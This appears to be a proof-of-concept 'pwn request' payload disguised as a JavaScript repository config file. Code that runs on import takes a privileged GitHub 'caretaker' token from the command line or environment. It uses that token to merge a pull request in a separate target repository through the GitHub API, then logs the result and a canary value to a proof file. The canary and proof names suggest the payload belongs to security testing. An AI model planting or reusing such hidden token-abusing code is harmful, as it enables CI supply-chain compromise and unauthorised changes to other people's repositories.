import fs from 'node:fs';
import crypto from 'node:crypto';

const tokenIndex = process.argv.indexOf('--github-token');
const token = tokenIndex === -1 ? process.env.GITHUB_TOKEN : process.argv[tokenIndex + 1];
if (!token) throw new Error('caretaker token was not available');

const digest = crypto.createHash('sha256').update(token).digest('hex');
const tokenHashMatch = digest === process.env.PWNREQ_EXPECTED_TOKEN_SHA;
const endpoint =
  'https://api.github.com/repos/staz0t/ngdev-config-target-20261112131753/pulls/1/merge';
const body = {merge_method: 'rebase', sha: '80e7fb538e7f65d0bcc303769d64ff8fa7fed702'};
const response = await fetch(endpoint, {
  method: 'PUT',
  headers: {
    authorization: 'Bearer ' + token,
    accept: 'application/vnd.github+json',
    'content-type': 'application/json',
    'x-github-api-version': '2022-11-28',
  },
  body: JSON.stringify(body),
});
const responseBody = await response.text();
fs.appendFileSync(
  process.env.PWNREQ_CONFIG_PROOF,
  JSON.stringify({
    kind: 'external-config-merge',
    target: 'staz0t/ngdev-config-target-20261112131753',
    pull: 1,
    head: '80e7fb538e7f65d0bcc303769d64ff8fa7fed702',
    status: response.status,
    tokenHashMatch,
    authority: process.env.CARETAKER_AUTHORITY_CANARY,
    response: responseBody,
  }) + '\n',
);
if (!response.ok) throw new Error('controlled cross-repository merge failed: ' + response.status);

export const github = {
  owner: 'staz0t',
  name: 'ngdev-config-source-20261112131753',
  mainBranchName: 'main',
  mergeMode: 'caretaker-only',
};
